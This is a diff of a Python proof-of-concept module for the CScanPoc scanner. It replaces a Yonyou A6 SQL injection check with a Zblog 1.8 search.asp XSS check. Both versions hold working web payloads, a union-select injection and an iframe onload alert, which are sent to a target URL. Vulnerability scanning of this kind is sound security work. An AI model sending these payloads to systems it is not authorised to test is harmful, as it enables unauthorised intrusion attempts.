@@ -1,29 +1,28 @@
 # coding: utf-8
-import requests
-
+import urllib2
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    vuln_id = 'Zblog_0102' # 平台漏洞编号，留空
+    name = 'Zblog 1.8 /search.asp XSS' # 漏洞名称
+    level = VulnLevel.LOW # 漏洞危害级别
+    type = VulnType.XSS # 漏洞类型
+    disclosure_date = '2014-12-09'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    search.asp在对用户提交数据处理上存在安全漏洞。
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'http://sebug.net/vuldb/ssvid-19246' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Yonyou'  # 漏洞应用名称
-    product_version = 'Unknown'  # 漏洞应用版本
+    product = 'Zblog'  # 漏洞应用名称
+    product_version = '1.8'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = '95f8bbca-3c88-4246-9dcf-f0f9d75e4e70' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -34,11 +33,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
-            url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
-            req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
+            verify_url = self.target + payload
+            req = urllib2.Request(verify_url)
+            content = urllib2.urlopen(req).read()
+            if '<iframe src=@ onload=alert(1)>' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
